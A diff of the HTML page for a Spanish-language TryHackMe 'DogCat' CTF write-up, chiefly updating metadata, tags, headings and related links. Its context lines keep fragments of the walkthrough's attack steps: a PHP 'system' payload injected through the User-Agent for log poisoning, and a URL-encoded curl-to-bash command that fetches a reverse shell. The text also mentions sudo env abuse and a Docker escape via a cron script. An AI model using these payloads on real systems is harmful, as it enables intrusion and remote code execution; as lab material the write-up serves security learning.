@@ -1229,10 +1229,10 @@
 
 
     
-<meta name="description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español" />
+<meta name="description" content="DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios." />
 
 
-<meta name="keywords" content="lfi,cron">
+<meta name="keywords" content="lfi,cron,docker,lfi poisoning,wrappers">
 
 <meta name="created" content="2020-04-18T00:00:00&#43;0000">
 <meta name="modified" content="2020-04-18T00:00:00&#43;0000">
@@ -1246,7 +1246,7 @@
 <meta property="og:title" content="TryHackMe - DogCat">
 <meta property="og:url" content="https://sckull.github.io/posts/dogcat/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+<meta property="og:description" content="DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.">
 
   
     <meta property="og:image" content="https://sckull.github.io/images/posts/thm/dogcat/cover.webp">
@@ -1254,7 +1254,7 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="sckull">
     <meta property="twitter:title" content="TryHackMe - DogCat">
-    <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
+    <meta property="twitter:description" content="DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.">
   
 
 <meta name="generator" content="Hugo 0.68.3" />
@@ -1284,8 +1284,8 @@
     "datePublished": "2020-04-18T00:00:00Z",
     "dateModified": "2020-04-18T00:00:00Z",
     "url" : "https://sckull.github.io/posts/dogcat/",
-    "description": "DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.",
-    "keywords": ["lfi","cron"],
+    "description": "DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.",
+    "keywords": ["lfi","cron","docker","lfi poisoning","wrappers"],
     "image" : "https://sckull.github.io/images/posts/thm/dogcat/cover.webp",
     "author": {
       "@type": "Person",
@@ -1591,18 +1591,26 @@
   🏷️
   
 
+  <li><a href="https://sckull.github.io/tags/docker/" class="single__tag" title="docker">docker</a></li>
+  
+
   <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/lfi/" class="single__tag" title="lfi">lfi</a></li>
   
 
+  <li><a href="https://sckull.github.io/tags/lfi-poisoning/" class="single__tag" title="lfi poisoning">lfi poisoning</a></li>
+  
+
+  <li><a href="https://sckull.github.io/tags/wrappers/" class="single__tag" title="wrappers">wrappers</a></li>
+  
+
 </ul>
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <p>DogCat es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</p>
-
+      
 
 
 
@@ -1614,6 +1622,7 @@
     <img src="/images/posts/thm/dogcat/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
+<p>DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.</p>
 <h1 id="room">Room</h1>
 <table>
 <thead>
@@ -1776,7 +1785,7 @@ User-Agent:Mozilla/5.0 &lt;?php system<span class="o">(</span><span class="nv">$
 </div>
 </div><p>Vemos que en la respuesta tenemos acceso como usuario <code>www-data</code>.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp" alt="image" /></p>
-<h1 id="user---www-data">USER - WWW-DATA</h1>
+<h1 id="user---www-data--docker-">USER - WWW-DATA [ DOCKER ]</h1>
 <p>Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.</p>
 <p><strong>Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)</strong></p>
 <div class="highlight"><div class="chroma">
@@ -1797,7 +1806,7 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp" alt="image" /></p>
 <p>Nuestra segunda flag.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp" alt="image" /></p>
-<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
+<h1 id="privilege-escalation---docker">PRIVILEGE ESCALATION - DOCKER</h1>
 <p>Hacemos una pequeña enumeracion con <code>sudo -l -l</code> y vemos que tenemos permisos root (sudo) para ejecutar el comando <code>env</code>. Utilizamos env para obtener una shell root.</p>
 <p><img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp" alt="image" /></p>
 <div class="highlight"><div class="chroma">
@@ -1810,6 +1819,7 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
 </div>
 </div><p>Òbtenemos nuestra shell como usuario root y nuestra tercera flag.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.22.webp" alt="image" /></p>
+<h1 id="escaping-docker">ESCAPING DOCKER</h1>
 <p>Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo <code>.dockerenv</code> por lo que en el lugar que estamos es un contenedor.</p>
 <p>Dentro de la carpeta <code>/opt/backup</code> encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.<br />
 <img src="/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.03.webp" alt="image" /></p>
@@ -1891,13 +1901,13 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
       
     
       
-        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fdogcat%2f&title=TryHackMe%20-%20DogCat &summary=&source=Walkthrough%20%3a%3a%20Writeups%20de%20rooms%20y%20maquinas%20de%20TryHackMe%2c%20HackTheBox%20y%20CTFs%2c%20en%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fdogcat%2f&title=TryHackMe%20-%20DogCat &summary=DogCat%20es%20una%20maquina%20de%20TryHackMe%2c%20explotando%20la%20vulnerabilidad%20LFI%20con%20wrappers%20de%20PHP%20obtuvimos%20la%20primera%20flag.%20Realizando%20Log%20Poisoning%20obtuvimos%20una%20shell.%20Escalamos%20privilegios%20utilizando%20ENV%20y%20Sudo%20en%20contenedor%20de%20Docker.%20Un%20script%20ejecutado%20por%20un%20CronJob%20del%20Host%20permitio%20escalar%20privilegios.&source=Walkthrough%20-%20Writeups%20%3a%3a%20TryHackMe%2c%20HackTheBox%2c%20CTFs%2c%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
           <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
         </a>
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20DogCat&url=https%3a%2f%2fsckull.github.io%2fposts%2fdogcat%2f&hashtags=lfi%2ccron&via=sckull" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20DogCat&url=https%3a%2f%2fsckull.github.io%2fposts%2fdogcat%2f&hashtags=lfi%2ccron%2cdocker%2clfi%20poisoning%2cwrappers&via=sckull" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2031,15 +2041,15 @@ bash%20-c%20%20<span class="s2">&#34;</span><span class="k">$(</span>curl%20-s%2
         </li>
         
         <li>
+          <a href="/posts/ultratech/" class="related__link">TryHackMe - Ultratech</a>
+        </li>
+        
+        <li>
           <a href="/posts/cmess/" class="related__link">TryHackMe - CMesS</a>
         </li>
         
         <li>
-          <a href="/posts/haystack/" class="related__link">Hack The Box - Haystack</a>
-        </li>
-        
-        <li>
-          <a href="/posts/writeup/" class="related__link">Hack The Box - Writeup</a>
+          <a href="/posts/networked/" class="related__link">Hack The Box - Networked</a>
         </li>
         
     </ul>
@@ -3230,8 +3240,9 @@ var a = document.getElementsByClassName('navbar__menu-item')
     <li><a href="#http-">HTTP</a></li>
     <li><a href="#lfi---cat-or-dog">LFI - CAT OR DOG</a></li>
     <li><a href="#rce---apache-log-poisoning">RCE - Apache Log Poisoning</a></li>
-    <li><a href="#user---www-data">USER - WWW-DATA</a></li>
-    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+    <li><a href="#user---www-data--docker-">USER - WWW-DATA [ DOCKER ]</a></li>
+    <li><a href="#privilege-escalation---docker">PRIVILEGE ESCALATION - DOCKER</a></li>
+    <li><a href="#escaping-docker">ESCAPING DOCKER</a></li>
   </ul>
 </nav>          
         </div>
